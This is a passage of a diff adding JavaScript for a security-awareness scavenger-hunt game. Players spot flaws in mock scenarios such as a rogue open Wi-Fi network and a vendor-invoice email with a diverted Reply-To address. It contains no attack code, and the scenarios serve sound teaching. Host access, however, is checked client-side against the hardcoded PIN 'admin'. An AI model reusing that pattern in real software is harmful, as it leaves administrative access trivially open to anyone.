+                render: function(targetFn, decoyFn) {
+                    return `
+                        <div class="bg-slate-950 border border-slate-800 rounded-2xl p-5 space-y-4 font-mono text-xs">
+                            <div class="flex items-center space-x-2 border-b border-slate-800 pb-3 text-slate-400">
+                                <i class="fa-solid fa-wifi text-cyan-400"></i>
+                                <span onclick="${decoyFn}" class="hunt-decoy">Available Wi-Fi Networks &bull; Corporate Campus</span>
+                            </div>
+                            <div class="space-y-2">
+                                <div onclick="${decoyFn}" class="hunt-decoy p-3 bg-slate-900 rounded-xl border border-slate-800 flex items-center justify-between text-slate-400">
+                                    <span>CorpNet_Secure (WPA3-Enterprise 802.1X)</span>
+                                    <i class="fa-solid fa-lock text-emerald-400"></i>
+                                </div>
+                                <div onclick="${targetFn}" class="hunt-target p-3 bg-slate-900 rounded-xl border border-slate-800 flex items-center justify-between text-slate-200">
+                                    <span>Company_Guest_Free_HighSpeed (Open - No Password)</span>
+                                    <i class="fa-solid fa-lock-open text-amber-400"></i>
+                                </div>
+                                <div onclick="${decoyFn}" class="hunt-decoy p-3 bg-slate-900 rounded-xl border border-slate-800 flex items-center justify-between text-slate-400">
+                                    <span>CorpNet_Facilities (WPA2-PSK)</span>
+                                    <i class="fa-solid fa-lock text-slate-500"></i>
+                                </div>
+                            </div>
+                        </div>
+                    `;
+                }
+            },
+            {
+                id: 10,
+                title: "Vendor Invoice Fraud & Reply-To Diversion",
+                category: "Business Email Compromise (BEC)",
+                objective: "Spot the hidden external Reply-To redirection address.",
+                hint: "Look at the Reply-To email address compared to the sender address.",
+                targetValue: "Reply-To: collections-team@quick-wire-transfer.com",
+                explanation: "The email displays a legitimate supplier in the 'From' header, but secretly routes replies to an attacker-controlled external domain ('quick-wire-transfer.com') to redirect invoice payments.",
+                securityTip: "Always confirm bank wire details and account changes with suppliers via a secondary out-of-band communication channel (such as a verified phone call).",
+                render: function(targetFn, decoyFn) {
+                    return `
+                        <div class="bg-slate-950 border border-slate-800 rounded-2xl p-5 space-y-4 font-sans text-xs">
+                            <div class="border-b border-slate-800 pb-3 space-y-1.5 font-mono">
+                                <div class="flex items-center">
+                                    <span class="text-slate-500 w-20">From:</span>
+                                    <span onclick="${decoyFn}" class="hunt-decoy text-slate-300 font-mono">Acme Hardware Supplies &lt;billing@acmehardware.com&gt;</span>
+                                </div>
+                                <div class="flex items-center">
+                                    <span class="text-slate-500 w-20">Reply-To:</span>
+                                    <span onclick="${targetFn}" class="hunt-target text-slate-200 font-mono">collections-team@quick-wire-transfer.com</span>
+                                </div>
+                                <div class="flex items-center">
+                                    <span class="text-slate-500 w-20">Subject:</span>
+                                    <span onclick="${decoyFn}" class="hunt-decoy text-slate-300 font-mono">Updated Wire Instructions for Invoice #8841</span>
+                                </div>
+                            </div>
+                            <div class="space-y-3 text-slate-300 leading-relaxed">
+                                <p onclick="${decoyFn}" class="hunt-decoy">Attention Accounts Payable,</p>
+                                <p onclick="${decoyFn}" class="hunt-decoy">Due to our quarterly audit, our primary banking partner has updated. Please direct all scheduled remittance to the updated account details below.</p>
+                                <div onclick="${decoyFn}" class="hunt-decoy p-3 bg-slate-900 rounded-xl border border-slate-800 font-mono text-[11px] text-slate-400">
+                                    Bank: International Commercial Routing &bull; Account: 994-118-2041
+                                </div>
+                            </div>
+                        </div>
+                    `;
+                }
+            }
+        ];
+
+        /* ======================================================== */
+        /* APPLICATION STATE & REAL-TIME SYNCHRONIZATION ENGINE     */
+        /* ======================================================== */
+        let currentParticipant = {
+            name: "",
+            rrId: "",
+            score: 0,
+            penaltiesAdded: 0,
+            timeSeconds: 0,
+            status: "REGISTERED",
+            completedTasks: [],
+            currentTaskIndex: 0,
+            savedDeckIds: [],
+            isPaused: false
+        };
+
+        let participantScenarios = [];
+        let currentTaskIndex = 0;
+        let attemptsThisTask = 0;
+        let elapsedSeconds = 0;
+        let gameTimerInterval = null;
+        let hostWarRoomTickerInterval = null;
+        let hintUsedThisTask = false;
+
+        // Dual Real-Time Communication Bus (BroadcastChannel + LocalStorage Event Fallback)
+        let syncChannel = null;
+        try {
+            if (window.BroadcastChannel) {
+                syncChannel = new BroadcastChannel('cybershield_realtime_sync');
+                syncChannel.onmessage = (event) => handleIncomingSync(event.data);
+            }
+        } catch (e) {
+            console.warn("BroadcastChannel not supported, falling back to storage events.");
+        }
+
+        function handleIncomingSync(payload) {
+            if (!payload || !payload.type) return;
+            if (payload.type === 'PARTICIPANT_UPDATE' || payload.type === 'RECONNECT_REQUEST') {
+                updateParticipantInRoster(payload);
+                renderHostWarRoom();
+                renderLobbyRoster();
+            } else if (payload.type === 'ROOM_START_BROADCAST') {
+                if (currentParticipant.status === 'IN_LOBBY') {
+                    showToast("Host launched the event! Entering Arena...", "info");
+                    launchArenaSession();
+                }
+            } else if (payload.type === 'RECONNECT_APPROVAL_SIGNAL') {
+                if (currentParticipant.rrId === payload.rrId) {
+                    if (payload.action === 'APPROVED') {
+                        showToast("Re-entry Approved by Host! Resuming task...", "info");
+                        resumeFromDisconnection(payload.participant);
+                    } else if (payload.action === 'DENIED') {
+                        showToast("Host has denied your re-entry request.", "error");
+                        currentParticipant.status = 'BLOCKED';
+                        openCustomModal("Re-Entry Rejected", "Your re-entry request was rejected by the Host Administrator.", "error");
+                        showScreen('screenOnboarding');
+                    }
+                }
+            } else if (payload.type === 'RESET_ROSTER') {
+                renderHostWarRoom();
+                renderLobbyRoster();
+                updateHomeCount();
+            }
+        }
+
+        /* Fisher-Yates Scenario Shuffler (Anti-Cheat) */
+        function shuffleScenarios(array) {
+            const arr = [...array];
+            for (let i = arr.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [arr[i], arr[j]] = [arr[j], arr[i]];
+            }
+            return arr;
+        }
+
+        /* Storage Helpers */
+        function getStoredRoster() {
+            try {
+                return JSON.parse(localStorage.getItem('cybershield_roster')) || [];
+            } catch (e) {
+                return [];
+            }
+        }
+
+        function saveParticipantToRoster(p) {
+            let roster = getStoredRoster();
+            const idx = roster.findIndex(item => item.rrId === p.rrId);
+            if (idx >= 0) {
+                roster[idx] = { ...roster[idx], ...p, lastActive: Date.now() };
+            } else {
+                roster.push({ ...p, joinedAt: Date.now(), lastActive: Date.now() });
+            }
+            try {
+                localStorage.setItem('cybershield_roster', JSON.stringify(roster));
+            } catch (e) {}
+            updateHomeCount();
+        }
+
+        function updateParticipantInRoster(p) {
+            let roster = getStoredRoster();
+            const idx = roster.findIndex(item => item.rrId === p.rrId);
+            if (idx >= 0) {
+                roster[idx] = { ...roster[idx], ...p, lastActive: Date.now() };
+                try {
+                    localStorage.setItem('cybershield_roster', JSON.stringify(roster));
+                } catch (e) {}
+            }
+        }
+
+        function broadcastParticipantState() {
+            const payload = {
+                type: 'PARTICIPANT_UPDATE',
+                ...currentParticipant,
+                timestamp: Date.now()
+            };
+            if (syncChannel) {
+                try { syncChannel.postMessage(payload); } catch(err){}
+            }
+            try {
+                localStorage.setItem('cybershield_peer_heartbeat', JSON.stringify(payload));
+            } catch(e){}
+        }
+
+        /* Time Formatter */
+        function formatTime(totalSec) {
+            const m = Math.floor(totalSec / 60);
+            const s = totalSec % 60;
+            return `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
+        }
+
+        /* Escape HTML helper */
+        function escapeHtml(str) {
+            if (!str) return '';
+            return String(str).replace(/[&<>"']/g, function(m) {
+                return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[m];
+            });
+        }
+
+        /* Web Audio API Sound Synthesizer (No external sound files) */
+        let audioCtx = null;
+        function initAudio() {
+            if (!audioCtx) {
+                const AudioContext = window.AudioContext || window.webkitAudioContext;
+                if (AudioContext) {
+                    audioCtx = new AudioContext();
+                }
+            }
+            if (audioCtx && audioCtx.state === 'suspended') {
+                audioCtx.resume();
+            }
+        }
+
+        function playSound(type) {
+            try {
+                initAudio();
+                if (!audioCtx) return;
+
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+
+                const now = audioCtx.currentTime;
+
+                if (type === 'correct') {
+                    // Ascending chime
+                    osc.type = 'triangle';
+                    osc.frequency.setValueAtTime(523.25, now); // C5
+                    osc.frequency.exponentialRampToValueAtTime(1046.50, now + 0.25); // C6
+                    gain.gain.setValueAtTime(0.2, now);
+                    gain.gain.exponentialRampToValueAtTime(0.01, now + 0.35);
+                    osc.start(now);
+                    osc.stop(now + 0.35);
+                } else if (type === 'error') {
+                    // Low buzz
+                    osc.type = 'sawtooth';
+                    osc.frequency.setValueAtTime(160, now);
+                    osc.frequency.linearRampToValueAtTime(110, now + 0.2);
+                    gain.gain.setValueAtTime(0.3, now);
+                    gain.gain.exponentialRampToValueAtTime(0.01, now + 0.25);
+                    osc.start(now);
+                    osc.stop(now + 0.25);
+                } else if (type === 'penalty') {
+                    // Harsh alarm
+                    osc.type = 'sawtooth';
+                    osc.frequency.setValueAtTime(320, now);
+                    osc.frequency.setValueAtTime(240, now + 0.15);
+                    gain.gain.setValueAtTime(0.35, now);
+                    gain.gain.exponentialRampToValueAtTime(0.01, now + 0.4);
+                    osc.start(now);
+                    osc.stop(now + 0.4);
+                } else if (type === 'launch') {
+                    // Fanfare
+                    osc.type = 'sine';
+                    osc.frequency.setValueAtTime(440, now);
+                    osc.frequency.exponentialRampToValueAtTime(880, now + 0.3);
+                    gain.gain.setValueAtTime(0.25, now);
+                    gain.gain.exponentialRampToValueAtTime(0.01, now + 0.4);
+                    osc.start(now);
+                    osc.stop(now + 0.4);
+                }
+            } catch(e) {}
+        }
+
+        /* Toast Notifications */
+        function showToast(message, type = 'info') {
+            const container = document.getElementById('toastContainer');
+            if (!container) return;
+
+            const toast = document.createElement('div');
+            toast.className = `px-4 py-2.5 rounded-2xl shadow-xl border text-xs font-mono font-bold flex items-center space-x-2 transition-all transform duration-300 translate-y-2 opacity-0 pointer-events-auto ${
+                type === 'error' ? 'bg-rose-950/90 text-rose-200 border-rose-500/50' : 
+                type === 'success' ? 'bg-emerald-950/90 text-emerald-200 border-emerald-500/50' : 
+                'bg-slate-900/90 text-cyan-300 border-cyan-500/50'
+            }`;
+
+            const iconClass = type === 'error' ? 'fa-triangle-exclamation' : type === 'success' ? 'fa-circle-check' : 'fa-circle-info';
+            toast.innerHTML = `<i class="fa-solid ${iconClass}"></i><span>${escapeHtml(message)}</span>`;
+
+            container.appendChild(toast);
+
+            requestAnimationFrame(() => {
+                toast.classList.remove('translate-y-2', 'opacity-0');
+            });
+
+            setTimeout(() => {
+                toast.classList.add('opacity-0', 'translate-y-2');
+                setTimeout(() => toast.remove(), 300);
+            }, 3500);
+        }
+
+        /* In-App Custom Modal (Replaces window.alert / confirm) */
+        function openCustomModal(title, message, type = 'info') {
+            const modal = document.getElementById('modalCustomMessage');
+            const titleEl = document.getElementById('customModalTitle');
+            const bodyEl = document.getElementById('customModalBody');
+            const iconEl = document.getElementById('customModalIcon');
+
+            titleEl.textContent = title;
+            bodyEl.textContent = message;
+
+            if (type === 'error') {
+                iconEl.className = 'w-12 h-12 rounded-full mx-auto flex items-center justify-center text-2xl bg-rose-500/20 text-rose-400 border border-rose-500/30';
+                iconEl.innerHTML = '<i class="fa-solid fa-triangle-exclamation"></i>';
+            } else if (type === 'success') {
+                iconEl.className = 'w-12 h-12 rounded-full mx-auto flex items-center justify-center text-2xl bg-emerald-500/20 text-emerald-400 border border-emerald-500/30';
+                iconEl.innerHTML = '<i class="fa-solid fa-circle-check"></i>';
+            } else {
+                iconEl.className = 'w-12 h-12 rounded-full mx-auto flex items-center justify-center text-2xl bg-cyan-500/20 text-cyan-400 border border-cyan-500/30';
+                iconEl.innerHTML = '<i class="fa-solid fa-circle-info"></i>';
+            }
+
+            modal.classList.remove('hidden');
+        }
+
+        function closeCustomModal() {
+            document.getElementById('modalCustomMessage').classList.add('hidden');
+        }
+
+        /* Screen View Switcher */
+        function showScreen(screenId) {
+            const screens = ['screenOnboarding', 'screenParticipantLobby', 'screenHostWarRoom', 'screenArena', 'screenResults', 'screenPendingApproval'];
+            screens.forEach(id => {
+                const el = document.getElementById(id);
+                if (el) el.classList.add('hidden');
+            });
+            const target = document.getElementById(screenId);
+            if (target) target.classList.remove('hidden');
+
+            const navActive = document.getElementById('navActiveControls');
+            if (screenId === 'screenArena') {
+                navActive.classList.remove('hidden');
+            } else {
+                navActive.classList.add('hidden');
+            }
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function returnToHomeSafe() {
+            if (currentParticipant.status === 'IN_PROGRESS') {
+                // Keep playing
+                return;
+            }
+            showScreen('screenOnboarding');
+            updateHomeCount();
+        }
+
+        /* Update Home Screen Count */
+        function updateHomeCount() {
+            const roster = getStoredRoster();
+            const countEl = document.getElementById('onboardingParticipantsCount');
+            if (countEl) countEl.textContent = roster.length;
+        }
+
+        /* Host PIN Dialog */
+        function openHostPinModal() {
+            const input = document.getElementById('inputHostPin');
+            input.value = '';
+            document.getElementById('modalHostPin').classList.remove('hidden');
+            setTimeout(() => input.focus(), 100);
+        }
+
+        function closeHostPinModal() {
+            document.getElementById('modalHostPin').classList.add('hidden');
+        }
+
+        function verifyHostPin() {
+            const pin = document.getElementById('inputHostPin').value.trim();
+            if (pin === 'admin') {
+                closeHostPinModal();
+                showScreen('screenHostWarRoom');
+                renderHostWarRoom();
+                startHostWarRoomTicker();
+                showToast("Host War Room Access Authorized", "success");
+            } else {
+                showToast("Invalid Host PIN. Access denied.", "error");
+            }
+        }
+
+        /* Handle Participant Registration Form Submit (Strict Single Entry) */
+        function handleRegistrationSubmit(e) {
+            e.preventDefault();
+            initAudio();
+
+            const name = document.getElementById('inputFullName').value.trim();
+            const rrId = document.getElementById('inputRrId').value.trim().toUpperCase();
+
+            if (!name || !rrId) {
+                showToast("Please enter your Name and RR ID / WL ID", "error");
+                return;
+            }
+
+            const roster = getStoredRoster();
+            const existing = roster.find(p => p.rrId === rrId);
+
+            // RULE 1: STRICT SINGLE ENTRY - NO DUPLICATE ENTRIES ALLOWED
+            if (existing) {
+                if (existing.status === 'COMPLETED') {
+                    showToast(`Access Denied: ID ${rrId} has already completed the hunt!`, "error");
+                    openCustomModal(
+                        "Registration Locked", 
+                        `ID ${rrId} (${existing.name}) has already completed the Cyber Security Scavenger Hunt with a score of ${existing.score}/10 in ${formatTime(existing.timeSeconds)}. Duplication is strictly not permitted.`,
+                        "error"
+                    );
+                    return;
+                }
+
+                if (existing.status === 'BLOCKED') {
+                    showToast(`Access Denied: ID ${rrId} is blocked by Host.`, "error");
+                    openCustomModal("Access Blocked", "Your ID has been restricted by the Administrator.", "error");
+                    return;
+                }
+
+                // RULE 2: DISCONNECTED MID-ACTIVITY -> NOTIFY HOST FOR APPROVAL
+                if (existing.status === 'IN_PROGRESS' || existing.status === 'PENDING_APPROVAL') {
+                    currentParticipant = { ...existing };
+                    currentParticipant.status = 'PENDING_APPROVAL';
+                    updateParticipantInRoster(currentParticipant);
+
+                    // Alert Admin in real-time
+                    const reconnectAlert = {
+                        type: 'RECONNECT_REQUEST',
+                        ...currentParticipant,
+                        timestamp: Date.now()
+                    };
+                    if (syncChannel) {
+                        try { syncChannel.postMessage(reconnectAlert); } catch(err){}
+                    }
+                    try {
+                        localStorage.setItem('cybershield_peer_heartbeat', JSON.stringify(reconnectAlert));
+                    } catch(e){}
+
+                    // Show Pending Screen to User
+                    document.getElementById('pendingScreenName').textContent = currentParticipant.name;
+                    document.getElementById('pendingScreenRr').textContent = currentParticipant.rrId;
+                    document.getElementById('pendingScreenTask').textContent = `Task #${(currentParticipant.currentTaskIndex || 0) + 1} of 10`;
+                    document.getElementById('pendingScreenTime').textContent = formatTime(currentParticipant.timeSeconds || 0);
+                    document.getElementById('pendingScreenScore').textContent = `${currentParticipant.score || 0} / 10`;
+
+                    showScreen('screenPendingApproval');
+                    showToast("Reconnection request transmitted to Host.", "info");
+                    return;
+                }
+            }
+
+            // Normal new registration
+            currentParticipant.name = name;
+            currentParticipant.rrId = rrId;
+            currentParticipant.status = "IN_LOBBY";
+            currentParticipant.score = 0;
+            currentParticipant.timeSeconds = 0;
+            currentParticipant.penaltiesAdded = 0;
+            currentParticipant.currentTaskIndex = 0;
+            currentParticipant.isPaused = false;
+
+            // Update user details across badges
+            document.getElementById('navParticipantName').textContent = name;
+            document.getElementById('navParticipantRr').textContent = rrId;
+            document.getElementById('lobbyUserName').textContent = name;
+            document.getElementById('lobbyUserRr').textContent = rrId;
+
+            // Save participant to live room roster & broadcast
+            saveParticipantToRoster(currentParticipant);
+            broadcastParticipantState();
+
+            showScreen('screenParticipantLobby');
+            renderLobbyRoster();
+            showToast(`Welcome ${name}! Waiting for host to launch.`, "info");
+        }
+
+        /* Render Lobby Roster */
+        function renderLobbyRoster() {
+            const roster = getStoredRoster();
+            const container = document.getElementById('lobbyPeersContainer');
+            const countEl = document.getElementById('lobbyParticipantsCount');
+            if (!container || !countEl) return;
+
+            countEl.textContent = `${roster.length} Joined`;
+            container.innerHTML = '';
+
+            roster.forEach(p => {
+                const tag = document.createElement('span');
+                tag.className = 'px-2.5 py-1 rounded-lg bg-slate-950 border border-slate-800 text-slate-300 font-mono text-[11px] flex items-center space-x-1.5';
+                tag.innerHTML = `
+                    <span class="w-1.5 h-1.5 rounded-full ${p.status === 'IN_PROGRESS' ? 'bg-cyan-400 animate-ping' : p.status === 'COMPLETED' ? 'bg-emerald-400' : 'bg-amber-400'}"></span>
+                    <span>${escapeHtml(p.name)}</span>
+                    <span class="text-slate-500">(${escapeHtml(p.rrId)})</span>
+                `;
+                container.appendChild(tag);
+            });
+        }
+
+        /* Host Triggers Master Competition Launch for All */
+        function hostLaunchCompetition() {
+            initAudio();
+            const launchSignal = {
+                type: 'ROOM_START_BROADCAST',
+                timestamp: Date.now()
+            };
+            if (syncChannel) {
+                try { syncChannel.postMessage(launchSignal); } catch(e){}
+            }
+            try {
+                localStorage.setItem('cybershield_launch_signal', Date.now().toString());
+            } catch(e){}
+
+            showToast("Competition launched for all participants!", "success");
+            playSound('launch');
+        }
+
+        /* Launch Arena Session for Participant */
+        function launchArenaSession() {
+            // Generate a fresh randomized sequence of the 10 scenarios for this participant
+            participantScenarios = shuffleScenarios(SCENARIOS);
+
+            currentParticipant.status = 'IN_PROGRESS';
+            currentParticipant.timeSeconds = 0;
+            currentParticipant.currentTaskIndex = 0;
+            currentParticipant.score = 0;
+            currentParticipant.penaltiesAdded = 0;
+            currentParticipant.completedTasks = [];
+            currentParticipant.savedDeckIds = participantScenarios.map(s => s.id);
+            currentParticipant.isPaused = false;
+
+            saveParticipantToRoster(currentParticipant);
+            broadcastParticipantState();
+
+            showScreen('screenArena');
+            currentTaskIndex = 0;
+            attemptsThisTask = 0;
+            elapsedSeconds = 0;
+
+            loadScenario(currentTaskIndex);
+            startGameTimer();
+            playSound('launch');
+            showToast("Challenge Arena Active! Scenarios randomized.", "info");
+        }
+
+        /* Resume Participant from Disconnection after Host Approval */
+        function resumeFromDisconnection(restoredData) {
+            currentParticipant = { ...restoredData };
+            currentParticipant.status = 'IN_PROGRESS';
+            currentParticipant.isPaused = false;
+
+            // Reconstruct the exact same randomized deck order the user was assigned
+            if (currentParticipant.savedDeckIds && currentParticipant.savedDeckIds.length > 0) {
+                participantScenarios = currentParticipant.savedDeckIds.map(id => SCENARIOS.find(s => s.id === id)).filter(Boolean);
+            } else {
+                participantScenarios = [...SCENARIOS];
+            }
+
+            currentTaskIndex = currentParticipant.currentTaskIndex || 0;
+            elapsedSeconds = currentParticipant.timeSeconds || 0;
+            attemptsThisTask = 0;
+
+            // Update nav badges
+            document.getElementById('navParticipantName').textContent = currentParticipant.name;
+            document.getElementById('navParticipantRr').textContent = currentParticipant.rrId;
+
+            saveParticipantToRoster(currentParticipant);
+            broadcastParticipantState();
+
+            showScreen('screenArena');
+            loadScenario(currentTaskIndex);
+            startGameTimer();
+            playSound('launch');
+            showToast(`Resumed at Task #${currentTaskIndex + 1}!`, "success");
+        }
+
+        /* Timer Management */
+        function startGameTimer() {
+            stopGameTimer();
+            currentParticipant.isPaused = false;
+            gameTimerInterval = setInterval(() => {
+                elapsedSeconds++;
+                currentParticipant.timeSeconds = elapsedSeconds;
+                document.getElementById('navLiveTimer').textContent = formatTime(elapsedSeconds);
+                
+                // Broadcast every 2 seconds or on task change to save performance
+                if (elapsedSeconds % 2 === 0) {
+                    saveParticipantToRoster(currentParticipant);
+                    broadcastParticipantState();
+                }
+            }, 1000);
+        }
+
+        function pauseGameTimer() {
+            if (gameTimerInterval) {
+                clearInterval(gameTimerInterval);
+                gameTimerInterval = null;
+            }
+            currentParticipant.isPaused = true;
+            saveParticipantToRoster(currentParticipant);
+            broadcastParticipantState();
+        }
+
+        function resumeGameTimer() {
+            startGameTimer();
+        }
+
+        function stopGameTimer() {
+            if (gameTimerInterval) {
+                clearInterval(gameTimerInterval);
+                gameTimerInterval = null;
+            }
+        }
+
+        /* Load Scenario into Viewport */
+        function loadScenario(index) {
+            const list = (participantScenarios && participantScenarios.length > 0) ? participantScenarios : SCENARIOS;
+            const scenario = list[index];
+            if (!scenario) {
+                finishCompetition();
+                return;
+            }
+
+            attemptsThisTask = 0;
+            hintUsedThisTask = false;
+
+            // Update HUD elements
+            document.getElementById('arenaTaskIndex').textContent = (index + 1).toString().padStart(2, '0');
+            document.getElementById('arenaTaskProgress').textContent = `TASK ${index + 1} OF ${list.length}`;
+            document.getElementById('arenaScenarioTitle').textContent = scenario.title;
+            document.getElementById('arenaTriesCount').textContent = `0 / 3`;
+            document.getElementById('arenaScoreCount').textContent = `${currentParticipant.score} / ${list.length}`;
+            document.getElementById('arenaObjectiveText').textContent = scenario.objective;
+
+            // Reset Hint UI
+            const hintCard = document.getElementById('arenaHintCard');
+            hintCard.classList.add('hidden');
+            document.getElementById('arenaHintLabel').textContent = 'Hint (1 Left)';
+            document.getElementById('arenaHintText').textContent = scenario.hint;
+
+            // Render Scenario HTML with zero styling giveaways
+            const viewport = document.getElementById('liveViewport');
+            viewport.innerHTML = scenario.render("handleTargetClick(event)", "handleDecoyClick(event)");
+        }
+
+        /* Toggle Hint (1 Allowed per Task) */
+        function toggleTaskHint() {
+            const hintCard = document.getElementById('arenaHintCard');
+            const hintLabel = document.getElementById('arenaHintLabel');
+
+            if (hintCard.classList.contains('hidden')) {
+                hintCard.classList.remove('hidden');
+                hintLabel.textContent = 'Hide Hint';
+                if (!hintUsedThisTask) {
+                    hintUsedThisTask = true;
+                    showToast("Tactical hint revealed.", "info");
+                }
+            } else {
+                hintCard.classList.add('hidden');
+                hintLabel.textContent = 'Hint (Used)';
+            }
+        }
+
+        /* Incorrect Decoy Click Handler (Vibration & Shake) */
+        function handleDecoyClick(e) {
+            if (e) e.stopPropagation();
+            attemptsThisTask++;
+            playSound('error');
+
+            // 1. Mobile Haptic Vibration
+            if (navigator.vibrate) {
+                try { navigator.vibrate([120, 60, 160]); } catch(err){}
+            }
+
+            // 2. Visual Screen Shake
+            const viewport = document.getElementById('interactiveContainer');
+            viewport.classList.remove('screen-shake-effect');
+            void viewport.offsetWidth; // Trigger DOM reflow to restart animation
+            viewport.classList.add('screen-shake-effect');
+            setTimeout(() => viewport.classList.remove('screen-shake-effect'), 500);
+
+            // Update tries HUD
+            document.getElementById('arenaTriesCount').textContent = `${attemptsThisTask} / 3`;
+
+            // Check 3 attempts limit
+            if (attemptsThisTask >= 3) {
+                // Apply 30s penalty and reveal
+                applyPenaltyAndReveal();
+            } else {
+                showToast(`Incorrect area clicked (${attemptsThisTask}/3 attempts). Inspect closer!`, "error");
+            }
+        }
+
+        /* Apply 30s Penalty and Show Answer */
+        function applyPenaltyAndReveal() {
+            pauseGameTimer();
+            playSound('penalty');
+
+            elapsedSeconds += 30;
+            currentParticipant.timeSeconds = elapsedSeconds;
+            currentParticipant.penaltiesAdded = (currentParticipant.penaltiesAdded || 0) + 30;
+            document.getElementById('navLiveTimer').textContent = formatTime(elapsedSeconds);
+
+            const list = (participantScenarios && participantScenarios.length > 0) ? participantScenarios : SCENARIOS;
+            const scenario = list[currentTaskIndex];
+
+            // Highlight target in screen
+            const targetEl = document.querySelector('#liveViewport .hunt-target');
+            if (targetEl) {
+                targetEl.classList.add('reveal-flaw-highlight');
+            }
+
+            // Open Debrief Modal
+            showDebriefModal(false, scenario);
+        }
+
+        /* Correct Target Click Handler */
+        function handleTargetClick(e) {
+            if (e) e.stopPropagation();
+            pauseGameTimer();
+            playSound('correct');
+
+            currentParticipant.score++;
+            document.getElementById('arenaScoreCount').textContent = `${currentParticipant.score} / 10`;
+
+            const list = (participantScenarios && participantScenarios.length > 0) ? participantScenarios : SCENARIOS;
+            const scenario = list[currentTaskIndex];
+
+            // Highlight target in screen
+            const targetEl = document.querySelector('#liveViewport .hunt-target');
+            if (targetEl) {
+                targetEl.classList.add('reveal-flaw-highlight');
+            }
+
+            // Open Debrief Modal
+            showDebriefModal(true, scenario);
+        }
+
+        /* Show Debrief Modal with Enlarged Security Tips */
+        function showDebriefModal(isSuccess, scenario) {
+            const modal = document.getElementById('modalDebrief');
+            const iconEl = document.getElementById('debriefStatusIcon');
+            const badgeEl = document.getElementById('debriefBadge');
+            const titleEl = document.getElementById('debriefTitle');
+            const spotlightEl = document.getElementById('debriefSpotlightContent');
+            const explainEl = document.getElementById('debriefExplanation');
+            const tipEl = document.getElementById('debriefSecurityTip');
+            const penaltyNotice = document.getElementById('debriefPenaltyNotice');
+            const pausedTimeEl = document.getElementById('debriefPausedTime');
+
+            pausedTimeEl.textContent = formatTime(elapsedSeconds);
+            spotlightEl.textContent = scenario.targetValue;
+            explainEl.textContent = scenario.explanation;
+            tipEl.textContent = scenario.securityTip;
+
+            if (isSuccess) {
+                iconEl.className = 'w-12 h-12 rounded-2xl bg-emerald-500/10 border border-emerald-500/40 text-emerald-400 flex items-center justify-center text-2xl shadow-lg';
+                iconEl.innerHTML = '<i class="fa-solid fa-shield-check"></i>';
+                badgeEl.className = 'text-xs font-mono uppercase tracking-wider text-emerald-400 bg-emerald-950/60 border border-emerald-800/80 px-2.5 py-0.5 rounded-full font-bold';
+                badgeEl.textContent = 'Threat Successfully Neutralized';
+                titleEl.textContent = 'Vulnerability Spotted & Disarmed!';
+                penaltyNotice.classList.add('hidden');
+            } else {
+                iconEl.className = 'w-12 h-12 rounded-2xl bg-rose-500/10 border border-rose-500/40 text-rose-400 flex items-center justify-center text-2xl shadow-lg';
+                iconEl.innerHTML = '<i class="fa-solid fa-triangle-exclamation"></i>';
+                badgeEl.className = 'text-xs font-mono uppercase tracking-wider text-rose-400 bg-rose-950/60 border border-rose-800/80 px-2.5 py-0.5 rounded-full font-bold';
+                badgeEl.textContent = '3 Tries Exceeded - Target Exposed';
+                titleEl.textContent = 'Vulnerability Revealed (+30s Penalty)';
+                penaltyNotice.classList.remove('hidden');
+            }
+
+            modal.classList.remove('hidden');
+        }
+
+        /* Advance to Next Task */
+        function advanceToNextTask() {
+            document.getElementById('modalDebrief').classList.add('hidden');
+            
+            // Clean up highlighted target
+            const targetEl = document.querySelector('#liveViewport .hunt-target');
+            if (targetEl) {
+                targetEl.classList.remove('reveal-flaw-highlight');
+            }
+
+            currentTaskIndex++;
+            currentParticipant.currentTaskIndex = currentTaskIndex;
+            saveParticipantToRoster(currentParticipant);
+            broadcastParticipantState();
+
+            const totalTasks = (participantScenarios && participantScenarios.length) ? participantScenarios.length : SCENARIOS.length;
+            if (currentTaskIndex < totalTasks) {
+                loadScenario(currentTaskIndex);
+                resumeGameTimer();
+            } else {
+                finishCompetition();
+            }
+        }
+
+        /* Finish Competition (Single-Entry Finalized) */
+        function finishCompetition() {
+            stopGameTimer();
+            currentParticipant.status = 'COMPLETED';
+            currentParticipant.timeSeconds = elapsedSeconds;
+            currentParticipant.isPaused = false;
+
+            saveParticipantToRoster(currentParticipant);
+            broadcastParticipantState();
+
+            // Populate Results Screen (Personal debrief only - no public leaderboard)
+            document.getElementById('resultsParticipantName').textContent = currentParticipant.name;
+            document.getElementById('resultsParticipantRr').textContent = currentParticipant.rrId;
+            document.getElementById('resultsScore').textContent = `${currentParticipant.score} / 10`;
+            document.getElementById('resultsTime').textContent = formatTime(elapsedSeconds);
+            document.getElementById('resultsPenalties').textContent = `+${formatTime(currentParticipant.penaltiesAdded || 0)}`;
+
+            showScreen('screenResults');
+            showToast("Hunt Concluded! Score finalized in Host War Room.", "success");
+        }
+
+        /* Host War Room Telemetry and Second-by-Second Sorting */
+        function startHostWarRoomTicker() {
+            if (hostWarRoomTickerInterval) {
+                clearInterval(hostWarRoomTickerInterval);
+            }
+            hostWarRoomTickerInterval = setInterval(() => {
+                const warRoom = document.getElementById('screenHostWarRoom');
+                if (warRoom && !warRoom.classList.contains('hidden')) {
+                    renderHostWarRoom();
+                }
+            }, 1000);
+        }
+
+        function renderHostWarRoom() {
+            let roster = getStoredRoster();
+
+            // Real-Time Ranking Algorithm:
+            // 1. Total Score (Threats Found) - descending (highest first)
+            // 2. Total Time Consumed (seconds) - ascending (lowest time first)
+            roster.sort((a, b) => {
+                const scoreA = a.score || 0;
+                const scoreB = b.score || 0;
+                if (scoreB !== scoreA) {
+                    return scoreB - scoreA;
+                }
+                const timeA = a.timeSeconds || 0;
+                const timeB = b.timeSeconds || 0;
+                return timeA - timeB;
+            });
+
+            document.getElementById('hostStatTotal').textContent = roster.length;
+            const inLobby = roster.filter(p => p.status === 'IN_LOBBY').length;
+            const finished = roster.filter(p => p.status === 'COMPLETED').length;
+            const pendingList = roster.filter(p => p.status === 'PENDING_APPROVAL');
+
+            document.getElementById('hostStatLobby').textContent = inLobby;
+            document.getElementById('hostStatFinished').textContent = finished;
+
